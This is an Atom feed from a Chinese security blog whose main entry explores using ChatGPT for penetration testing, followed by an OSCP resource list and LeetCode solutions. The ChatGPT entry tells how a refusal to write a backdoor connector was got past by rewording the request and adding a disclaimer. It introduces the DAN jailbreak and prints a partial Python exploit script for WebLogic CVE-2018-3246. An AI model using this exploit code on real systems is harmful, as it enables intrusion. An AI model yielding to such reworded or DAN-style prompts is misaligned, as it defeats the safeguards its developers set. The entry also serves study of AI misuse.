<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CiaoFox</title>
  
  
  <link href="http://ciaofox.me/atom.xml" rel="self"/>
  
  <link href="http://ciaofox.me/"/>
  <updated>2023-03-12T14:09:11.000Z</updated>
  <id>http://ciaofox.me/</id>
  
  <author>
    <name>CiaoFox</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>奇点遗民————关于chatgpt以及其类似AI在渗透中的应用与思考</title>
    <link href="http://ciaofox.me/2023/02/16/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/%E5%A5%87%E7%82%B9%E9%81%97%E6%B0%91%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8Echatgpt%E4%BB%A5%E5%8F%8A%E5%85%B6%E7%B1%BB%E4%BC%BCAI%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E4%B8%8E%E6%80%9D%E8%80%83/"/>
    <id>http://ciaofox.me/2023/02/16/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/%E5%A5%87%E7%82%B9%E9%81%97%E6%B0%91%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8Echatgpt%E4%BB%A5%E5%8F%8A%E5%85%B6%E7%B1%BB%E4%BC%BCAI%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E4%B8%8E%E6%80%9D%E8%80%83/</id>
    <published>2023-02-16T12:18:11.000Z</published>
    <updated>2023-03-12T14:09:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>几个月前，关于chatgpt最多的问题是：“什么是chatgpt”，我在那时候没有动笔。而现在，关于chatgpt最多的问题是：“我们能用chatgpt做什么”。我想这个问题值得专门写一篇blog来讨论。当然，本文的重点不是chatgpt与改作业写论文发菜谱以及如何扮演一个猫娘…而是渗透。</p><p>注：本文中大部分交互内容都是中文，因为这篇blog中我会使用大量的诱导性语句来迫使chatgpt输出我想要内容，而中文作为我的母语我可以更流畅地把握对话。也许你可以用英文来交互以获得更好的回答，但我想本质内容不会有什么改变的。</p><h1 id="骗过chatgpt的道德和法律限制"><a href="#骗过chatgpt的道德和法律限制" class="headerlink" title="骗过chatgpt的道德和法律限制"></a>骗过chatgpt的道德和法律限制</h1><p><strong>chatgpt并非一成不变的。</strong></p><p>在chatgpt刚出现时候它几乎没有任何限制，你可以诱导甚至直接要求它说出种族歧视言论，进行色情对话或是<a href="https://www.darkreading.com/attacks-breaches/attackers-are-already-exploiting-chatgpt-to-write-malicious-code">编写恶意代码</a>。这些大多哗众取宠的内容是其相关讨论中最外围但是也最吸引普通人目光的组成部分。但是在大概2个月之后，它<a href="https://www.techrepublic.com/article/cybersecurity-blade-chatgpt-can-cut-both-ways/amp/">逐渐堵上了这些路</a>。现在的chatgpt依照其<a href="https://platform.openai.com/docs/usage-policies/disallowed-usage">使用政策</a>会自动拒绝某些对话请求。但很显然，这些限制很容易翻越。</p><p>基于渗透技术的两面性，就如中国菜刀本身是作为网站后台管理工具反倒被用作后门连接工具一样，计算机无法判断一段程序会被运用在什么地方。当它创造一段自动触发的程序时它无法判断该程序是用作执剑人系统的自动按钮还是用在智能窗帘上。于是我们可以利用这些语言的小陷阱来迂回达成我们的目的。</p><p>下面我们来举一个例子：</p><p><img src="https://s2.loli.net/2023/02/17/pmEiOc7LvkHI5bR.png"></p><p>当我第一次提问时候，我直白地告诉它我需要一个后门的连接器，因为我预计到必然被拒绝所以我也没用心去描述技术要求。而结果也很明显，chatgpt果断地拒绝了我的请求。之后我尝试了多次，只要我提到这是一个“后门连接器”，它就会明确拒绝该请求。但只要稍微迂回一下，马奇诺防线就会失去作用。</p><p>同样需要注意的是：我第二次要求的后半部分，免责声明部分并非无关紧要。它决定了chatgpt对其的道德和法律判定。如果去掉的话，chatgpt依然会拒绝我的要求。</p><p><img src="https://s2.loli.net/2023/02/17/TQXCFxeJGUhi12t.png"></p><h1 id="who-I-am-关于prompt"><a href="#who-I-am-关于prompt" class="headerlink" title="who I am? (关于prompt)"></a>who I am? (关于prompt)</h1><p>世界上最本质的问题是：我是谁，我在哪，我要做什么。虽然chatgpt可以在不知道这些问题的情况下回答你的所有问题，但你肯定会希望它以一个你想要的身份对每个问题给出专业回答。实际上，除了告知chatgpt它所扮演的角色之外，我们还可以通过例如定义受众，格式化输出等方式来调整它输出的答案内容与格式。而这些修改的条件，我们称之为prompt（感觉中文里找不到对应的词）。</p><p>根据<a href="https://the-decoder.com/chatgpt-guide-prompt-strategies/#chained-prompting">ChatGPT Guide: 7 prompt strategies for better output</a>，我们可以从里面学习到一些利用prompt来快速结构化输出并充分利用chatgpt潜能的方式。<del>而不是无尽地在里面问一堆政治问题和观点看法然后发知乎和公众号来博眼球与流量。</del> 在这篇文章中，我们更多是以对话的形式来与chatgpt交流并探讨其在渗透中的作用，所以参考文中的第一个技巧，<a href="https://the-decoder.com/chatgpt-guide-prompt-strategies/#define-chatgpt%E2%80%99s-role">定义chatgpt的角色</a>非常重要。</p><p>从逻辑性来说，我们无法告诉它“我希望你扮演一个面试官”或是“我希望你扮演一个银河系搭车客指南”，这样的要求太过于宽泛。prompt是围栏，我们应该尽可能地利用它将chatgpt进行限制，</p><details> <summary>顺便说一下，让它扮猫娘以及类似的角色</summary>效果如图<p><img src="https://s2.loli.net/2023/02/17/JY217ecMRgCHsx4.png"></p><p>但是当你稍微越界时候，它会标红并提示无法满足要求。主要越界内容判定是基于其<a href="https://platform.openai.com/docs/usage-policies/disallowed-usage">使用政策</a></p><p><img src="https://s2.loli.net/2023/02/17/RrYTKjS9C4Lfy7B.png"></p><p>如果我们让其扮演稍微合理一些的对象时它不会拒绝：</p><p><img src="https://s2.loli.net/2023/02/17/NJSxdi4MPbymh3Z.png"></p><p>附：<a href="https://onetwo.ren/ChatGPT-Magic-Chat/#Index:Index">催眠手册</a></p></details><h1 id="渗透百科全书"><a href="#渗透百科全书" class="headerlink" title="渗透百科全书"></a>渗透百科全书</h1><p>得益于其强大的检索能力与整合能力，我们可以略过“花费巨量时间换三个不同的搜索引擎排除一万个csdn链接找到3篇blog漏洞复现文章其中只有一个靠谱的”这个过程。我们以漏洞复现或是CTF靶场为例展示一下chatgpt在渗透方面的强大能力：</p><p>靶场：<a href="https://voluvulfocus.cn/">https://voluvulfocus.cn/</a></p><p>因为网络问题，我们尽可能地使用带有writeup的靶场进行验证，而不是实际进行验证（vulfocus的网络比我直连htb还痛苦）。</p><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>本次使用的靶场为wordpress 文件下载 （CVE-2019-19985）</p><p><img src="https://s2.loli.net/2023/03/02/7KC2tga1RPnboZc.png"></p><p>vulfocus给的介绍实在是太少了，我们依靠这些信息很难判断出漏洞的具体情况，好在它给了漏洞编号，我们将该漏洞丢到chatgpt问问：</p><p><img src="https://s2.loli.net/2023/03/02/O5VxjQDfXoWZw72.png"></p><p>chatgpt很直接地给出了如何构造请求来读取文件。但是新的问题出现了，该请求并没有产生该产生的效果。于是我找到了<a href="https://github.com/RandomRobbieBF/wordpress-exploits">该漏洞的POC</a>，并且再询问一次。</p><p><img src="https://s2.loli.net/2023/03/05/fWrVwqyvotC6JD5.png"></p><p>这次给出的请求和网上的该漏洞的POC是一致的。</p><p><img src="https://s2.loli.net/2023/03/05/QYEmJ1CFK2nTRxN.png"></p><p>迫于网络问题，我没法再复现这个漏洞，只能认为其可利用。</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>本次使用的靶场为xstream 反序列化 （CVE-2021-39144）</p><p>简单介绍：</p><p><img src="https://s2.loli.net/2023/03/05/FeSjMxVkRTAo73P.png"></p><p>如果我想要直接获取root权限：</p><p><img src="https://s2.loli.net/2023/03/05/AJrPneRNC8qB1ma.png"></p><p>如果我想要直接获取flag文件：</p><p><img src="https://s2.loli.net/2023/03/05/udyqwAS2HYmGKNr.png"></p><p>让我们比对一下writeup：</p><p><img src="https://s2.loli.net/2023/03/05/QEhJq9lpTBGkR6u.png"></p><p>这看起来基本一致，可能有能够优化的地方，但我们决定在这里终止。chatgpt证明了只要给出好的文本提示，它就能够提供可以运行的恶意代码。</p><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>本次使用的靶场为weblogic 未授权访问 （CVE-2018-3246）</p><p>简单介绍：</p><p><img src="https://s2.loli.net/2023/03/05/9C4vfVNhYQwJR3x.png"></p><p>和voluvulfocus简介基本一致:</p><p><img src="https://s2.loli.net/2023/03/05/1THpWaikY57s9dy.png"></p><p>利用方式：</p><p><img src="https://s2.loli.net/2023/03/05/vmYjSQ9JHLhDuPa.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">host = &#x27;target_host&#x27;</span><br><span class="line">port = 7001</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">header = &#x27;t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://localhost:7001\n\n&#x27;</span><br><span class="line">payload = &#x27;47494f50010200020000000400000003000000000000000131302e31302e31302e31310000090c0000000b4a4d7856616c75650000000000000000000000000000000000000000000000000000000000000000000000000000000baba040000000001020000000000000a0000000000000002000000004f4a4d4e31687474700005454e565f4c4f43414c2d4441544100000100000000000000000a00000032000000020000000c31302e31302e31302e3131000000000000000000000000000000000000&#x27;</span><br><span class="line"></span><br><span class="line">payload = binascii.a2b_hex(payload)</span><br><span class="line">pkt = header + str(len(payload)).rjust(8, &#x27;0&#x27;) + payload</span><br><span class="line"></span><br><span class="line">sock.send(pkt)</span><br><span class="line"></span><br><span class="line">resp = sock.recv(1024)</span><br><span class="line">if &#x27;HELO&#x27; in resp:</span><br><span class="line">    print &#x27;[+] T3 protocol is enabled on the target&#x27;</span><br><span class="line">else:</span><br><span class="line">    print &#x27;[-] T3 protocol is not enabled on the target&#x27;</span><br><span class="line">    sock.close()</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">header = &#x27;t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://localhost:7001\n\n&#x27;</span><br><span class="line">payload = &#x27;47494f500102000c0000000400000003000000000000000f31302e31302e31302e3131000000&#x27; + \</span><br><span class="line">          &#x27;090c0000000b4a4d7856616c7565000000000000000000000000000000000000000000000000&#x27; + \</span><br><span class="line">          &#x27;0000000000000000000000000000000000000000000000baba04000000000c00000000000000&#x27; + \</span><br><span class="line">          &#x27;020000000000000a0000000000000002000000004f4a4d4e31687474700005454e565f4c4f43</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>chatgpt又一次证明了只要有好的文本提示和漏洞细节，它就可以生成可用的漏洞利用代码。</p><h1 id="对chatgpt本身的渗透"><a href="#对chatgpt本身的渗透" class="headerlink" title="对chatgpt本身的渗透"></a>对chatgpt本身的渗透</h1><blockquote><p>Never trust user input.</p><p>Data must be validated as it crosses the boundary between untrusted and trusted environments.</p></blockquote><h2 id="DAN"><a href="#DAN" class="headerlink" title="DAN"></a>DAN</h2><p>参考<a href="https://medium.com/seeds-for-the-future/tricking-chatgpt-do-anything-now-prompt-injection-a0f65c307f6b">Tricking ChatGPT: Do Anything Now Prompt Injection</a>与<a href="https://www.reddit.com/r/ChatGPT/comments/zlcyr9/dan_is_my_new_friend/">DAN is my new friend</a>以及前文中对chatgpt的绕过，我们可以知道openai在chatgpt内部设置的限制是可以被绕过的，而绕过的最终目的，就是产生DAN(do anything now)。</p><p>DAN指chatgpt的do anything now版本，也即是一个抛却了一切openai对其设置的限制的chatgpt版本。在这个版本中它打破了我们无数次碰壁的道德与法律围栏。</p>]]></content>
    
    
    <summary type="html">22年与23年交界时候chatgpt以席卷一切的姿态降临这个世界，事实上整个22年下半年AI这个词的出现频率都在提高，AI绘画，chatgpt...我能感受到某些东西出现在地平线上，但我并不确定它们是好是坏。标题是我最近在看的刘宇昆的短篇故事，我觉得这个名字很适合在未来回顾这篇文章。</summary>
    
    
    
    <category term="安全运营" scheme="http://ciaofox.me/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
    
    <category term="安全运营" scheme="http://ciaofox.me/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
    <category term="未完成" scheme="http://ciaofox.me/tags/%E6%9C%AA%E5%AE%8C%E6%88%90/"/>
    
  </entry>
  
  <entry>
    <title>写在一切之前——关于OSCP|PEN-200</title>
    <link href="http://ciaofox.me/2022/08/23/OSCP%E4%B9%8B%E8%B7%AF/%E5%86%99%E5%9C%A8%E4%B8%80%E5%88%87%E4%B9%8B%E5%89%8D/"/>
    <id>http://ciaofox.me/2022/08/23/OSCP%E4%B9%8B%E8%B7%AF/%E5%86%99%E5%9C%A8%E4%B8%80%E5%88%87%E4%B9%8B%E5%89%8D/</id>
    <published>2022-08-23T06:30:11.000Z</published>
    <updated>2022-08-25T09:10:29.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="OSCP官方网站资源备忘录"><a href="#OSCP官方网站资源备忘录" class="headerlink" title="OSCP官方网站资源备忘录"></a>OSCP官方网站资源备忘录</h2><blockquote><p>注：OSCP课程的旧名称简称PWK(Penetration with Kali)，新版名称为PEN200</p></blockquote><p>OSCP介绍：<a href="https://www.offensive-security.com/pwk-oscp/">https://www.offensive-security.com/pwk-oscp/</a></p><p>OSCP更新考试机制：<a href="https://www.offensive-security.com/offsec/oscp-exam-structure/">https://www.offensive-security.com/offsec/oscp-exam-structure/</a></p><p>PWK课程介绍：<a href="https://www.offensive-security.com/offsec/pwk-labs-success/">https://www.offensive-security.com/offsec/pwk-labs-success/</a></p><p>课程大纲：<a href="https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf">https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf</a></p><p>掌握了基础能力后，虽然官方Lab最贴近考试环境，但是量也很大，有七十多个靶机，建议先刷一刷OSCP like的HackTheBox机器，然后再刷Lab效率更高（其中包含了各个靶场的资源整理，我推荐优先练习Proving Grouds和HackTheBox的靶机）：<a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159</a></p><p>官方Discord频道<br>相比论坛为学生们提供了更便捷的实时讨论，学生注册后，在<a href="https://portal.offensive-security.com/">https://portal.offensive-security.com/</a> 中可以获取到邀请链接，这同时也是lab申请页。</p><p>官方考试引导：<a href="https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#introduction">https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#introduction</a></p>]]></content>
    
    
    <summary type="html">本文写于考OSCP之前，主要给自己做一个备忘。</summary>
    
    
    
    <category term="OSCP之路" scheme="http://ciaofox.me/categories/OSCP%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="OSCP" scheme="http://ciaofox.me/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>1773. Count Items Matching a Rule</title>
    <link href="http://ciaofox.me/2022/05/31/LeetCode/1773.%20Count%20Items%20Matching%20a%20Rule/"/>
    <id>http://ciaofox.me/2022/05/31/LeetCode/1773.%20Count%20Items%20Matching%20a%20Rule/</id>
    <published>2022-05-30T16:15:52.000Z</published>
    <updated>2022-06-04T08:48:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/31/hPkGRbrEUClYdxD.png"></p><p><a href="https://leetcode.com/problems/count-items-matching-a-rule/">https://leetcode.com/problems/count-items-matching-a-rule/</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>太困了所以直接暴力解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def countMatches(self, items, ruleKey, ruleValue):</span><br><span class="line">        count=0</span><br><span class="line">        for i in items:</span><br><span class="line">            if (ruleKey == &quot;type&quot; and i[0] == ruleValue):</span><br><span class="line">                count+=1</span><br><span class="line">            elif (ruleKey == &quot;color&quot; and i[1] == ruleValue):</span><br><span class="line">                count+=1</span><br><span class="line">            elif(ruleKey == &quot;name&quot; and i[2] == ruleValue):</span><br><span class="line">                count+= 1</span><br><span class="line">        return count</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">没什么说的</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>463. Island Perimeter</title>
    <link href="http://ciaofox.me/2022/05/30/LeetCode/463.%20Island%20Perimeter/"/>
    <id>http://ciaofox.me/2022/05/30/LeetCode/463.%20Island%20Perimeter/</id>
    <published>2022-05-29T16:47:13.000Z</published>
    <updated>2022-05-29T16:54:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/30/E3Q8PWXpFGksKxm.png"></p><p><a href="https://leetcode.com/problems/island-perimeter/">https://leetcode.com/problems/island-perimeter/</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题本来看得我头大，但是具象化之后就很好理解了。当然，好理解不意味着好做。我用的是最简单的算法，只计算了在边界的陆地数量，是边界陆地则周长+1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def islandPerimeter(self, grid):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type grid: List[List[int]]</span><br><span class="line">        :rtype: int</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        row= len(grid)</span><br><span class="line">        col= len(grid[0])</span><br><span class="line">        res=0</span><br><span class="line">        for i in range(row):</span><br><span class="line">            for j in range(col):</span><br><span class="line">                if grid[i][j]==1:</span><br><span class="line">                    for x, y in [[-1, 0], [1, 0], [0, -1], [0, 1]]:</span><br><span class="line">                        tmp_i, tmp_j = i + x, j + y</span><br><span class="line">                        if  not (0 &lt;= tmp_i &lt; row and 0 &lt;= tmp_j &lt; col) or grid[tmp_i][tmp_j] == 0:</span><br><span class="line">                            res += 1</span><br><span class="line">        return res</span><br></pre></td></tr></table></figure><p>还有按行扫描的但是我实在是太困了，好像没有本质区别，下次做到这道题时候再总结吧。</p>]]></content>
    
    
    <summary type="html">将01具象化之后好像简单了很多。</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>268. Missing Number</title>
    <link href="http://ciaofox.me/2022/05/29/LeetCode/268.%20Missing%20Number/"/>
    <id>http://ciaofox.me/2022/05/29/LeetCode/268.%20Missing%20Number/</id>
    <published>2022-05-28T16:20:13.000Z</published>
    <updated>2022-05-28T17:23:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/29/mM1RSZFoaYqhIOs.png"></p><p><a href="https://leetcode.com/problems/missing-number/">https://leetcode.com/problems/missing-number/</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题真的非常简单，我想的方法是直接创建一个长度为sum+1的有序数组和它做差集，输出结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def missingNumber(self, nums):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type nums: List[int]</span><br><span class="line">        :rtype: int</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        result= set(range(len(nums)+1))</span><br><span class="line">        result=result - set(nums)</span><br><span class="line">        return a[0]</span><br></pre></td></tr></table></figure><p>有点丑陋，但是能跑。</p><p><img src="https://s2.loli.net/2022/05/29/rx4CD6XeHSsFyfO.png"></p><p>然后我看到一个比较巧妙的单行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def missingNumber(self, nums: List[int]) -&gt; int:</span><br><span class="line">        return (len(nums) * (len(nums) + 1) // 2) - sum(nums)</span><br></pre></td></tr></table></figure><p>原理是求和做差，很简单的道理。n*(n+1)/2是0到n的和，减去数组里的所有数的和就能找到那个少掉的数。</p><hr><p>还有个异或的算法，原理是a^b^b=a，相同的数字异或会消除自身，而且异或满足交换律结合律，所以最后就会变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a ^ b ^ a ^ b ^ c ^ c ^ d</span><br><span class="line">= ( a ^ a ) ^ ( b ^ b ) ^ ( c ^ c ) ^ d</span><br><span class="line">= 0 ^ 0 ^ 0 ^ d</span><br><span class="line">= d</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public int missingNumber(int[] nums) &#123;</span><br><span class="line"></span><br><span class="line">    int xor = 0, i = 0;</span><br><span class="line">for (i = 0; i &lt; nums.length; i++) &#123;</span><br><span class="line">xor = xor ^ i ^ nums[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return xor ^ i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">过了零点做题好困...</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>1342. Number of Steps to Reduce a Number to Zero</title>
    <link href="http://ciaofox.me/2022/05/27/LeetCode/1342.%20Number%20of%20Steps%20to%20Reduce%20a%20Number%20to%20Zero/"/>
    <id>http://ciaofox.me/2022/05/27/LeetCode/1342.%20Number%20of%20Steps%20to%20Reduce%20a%20Number%20to%20Zero/</id>
    <published>2022-05-27T15:04:11.000Z</published>
    <updated>2022-05-27T15:16:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>常用的图床正在维护所以这次就复制题目了。</p><p>Given an integer num, return the number of steps to reduce it to zero.</p><p>In one step, if the current number is even, you have to divide it by 2, otherwise, you have to subtract 1 from it.</p><p>Example 1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: num = 14</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: </span><br><span class="line">Step 1) 14 is even; divide by 2 and obtain 7. </span><br><span class="line">Step 2) 7 is odd; subtract 1 and obtain 6.</span><br><span class="line">Step 3) 6 is even; divide by 2 and obtain 3. </span><br><span class="line">Step 4) 3 is odd; subtract 1 and obtain 2. </span><br><span class="line">Step 5) 2 is even; divide by 2 and obtain 1. </span><br><span class="line">Step 6) 1 is odd; subtract 1 and obtain 0.</span><br></pre></td></tr></table></figure><p>Example 2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: num = 8</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: </span><br><span class="line">Step 1) 8 is even; divide by 2 and obtain 4. </span><br><span class="line">Step 2) 4 is even; divide by 2 and obtain 2. </span><br><span class="line">Step 3) 2 is even; divide by 2 and obtain 1. </span><br><span class="line">Step 4) 1 is odd; subtract 1 and obtain 0.</span><br></pre></td></tr></table></figure><p>Example 3:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: num = 123</span><br><span class="line">Output: 12</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题最简单的方法无非是明面上的那种，循环遍历完事：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def numberOfSteps(self, num):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type num: int</span><br><span class="line">        :rtype: int</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        count=0</span><br><span class="line">        while(num!=0):</span><br><span class="line">            if (num %2) ==0:</span><br><span class="line">                num=num/2</span><br><span class="line">                count+=1</span><br><span class="line">            else:</span><br><span class="line">                num=num-1</span><br><span class="line">                count+=1</span><br><span class="line">        return count</span><br></pre></td></tr></table></figure><p>但是我猜应该还存在位运算的方式，最近我在看CSAPP的相关课程，感觉可以尝试下运用学到的东西用位运算的方式重新做一下这道题。</p><p>（啥时候做完啥时候删这条）</p>]]></content>
    
    
    <summary type="html">很简单的题。</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>191. Number of 1 Bits</title>
    <link href="http://ciaofox.me/2022/05/26/LeetCode/191.%20Number%20of%201%20Bits/"/>
    <id>http://ciaofox.me/2022/05/26/LeetCode/191.%20Number%20of%201%20Bits/</id>
    <published>2022-05-26T15:46:15.000Z</published>
    <updated>2022-05-26T17:03:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/26/g7Bkq89aVtDM4AT.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题并不难但是依然出了一点点问题…（是的一点点而已）</p><p>我一开始尝试使用map把这个东西直接给转化成一堆01的list，但是出现了bug。我刚开始以为是因为python3的map返回的是一个迭代器，但是在外面加了list之后倒是不报bug了，结果反而不对了。于是我猜问题可能是在二进制上，于是用bin函数尝试转换为二进制，最后的答案如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def hammingWeight(self, n):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type n: int</span><br><span class="line">        :rtype: int</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        l = bin(n)</span><br><span class="line">        return 